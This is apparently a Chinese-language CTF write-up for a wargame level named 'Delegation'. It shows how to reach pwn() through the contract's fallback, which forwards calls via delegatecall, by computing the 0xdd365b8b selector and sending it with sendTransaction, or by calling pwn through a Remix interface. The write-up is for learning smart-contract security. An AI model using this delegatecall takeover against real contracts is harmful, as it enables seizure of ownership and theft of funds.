
### 相关资料：
[深度解析Solidity合约调用call，callcode，及delegatecall函数](https://www.jianshu.com/p/fd5075ff0ab9)

[Calling the Function of Another Contract in Solidity](https://medium.com/@blockchain101/calling-the-function-of-another-contract-in-solidity-f9edfa921f4c)


### 方法一
生成methods id然后直接调用，生成methods id的方法
- 1. 利用在线网站[Keccak-256](https://emn178.github.io/online-tools/keccak_256.html) ，输入`pwn()`，在输出部分取前8个字符（4bytes）并增加'0x'前缀: `0xdd365b8b`
- 2. 使用以下方法，输入`pwn()`, 返回`0xdd365b8b`

```json
pragma solidity ^0.4.24;

contract Utils {
    
    function getMethodsId(string fn) public pure returns(bytes4) {
       return bytes4(keccak256(abi.encodePacked(fn)));
    }
}
```

拿到methods id后，我们在console中通过SendTransaction可以调用Delegation的fallback方法：
`sendTransaction({from:player, to: instance, data:'0xdd365b8b'})`

### 方法二
在remix中操作，编译后填入关卡instance地址，点击at address，然后调用pwn即可（注意gas limit要调大一点不然会out of gas，不要用默认计算的gas limit），由于Delegation instance中并没有这个方法，所有会触发器fallback方法，msg.data就是这个pwd()的签名。

```json
pragma solidity ^0.4.18;

contract Delegation {
  function pwn() public;
}
```